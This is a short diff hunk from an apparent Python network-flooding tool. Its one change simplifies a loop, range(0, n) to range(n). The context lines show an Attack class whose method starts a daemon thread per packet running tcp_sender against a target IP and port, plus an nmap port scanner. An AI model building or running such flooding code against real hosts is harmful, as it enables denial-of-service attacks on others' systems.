@@ -10,7 +10,7 @@ class Attack:
 		self.packets = packets
 	def attack(self):
 		total = 0
-		for x in range(0, int(self.packets)):
+		for x in range(int(self.packets)):
 			threading.Thread(target=tcp_sender, args=(self.ip, self.port), daemon=True).start()
 			total+=1
 			scanner = nmap.PortScanner()
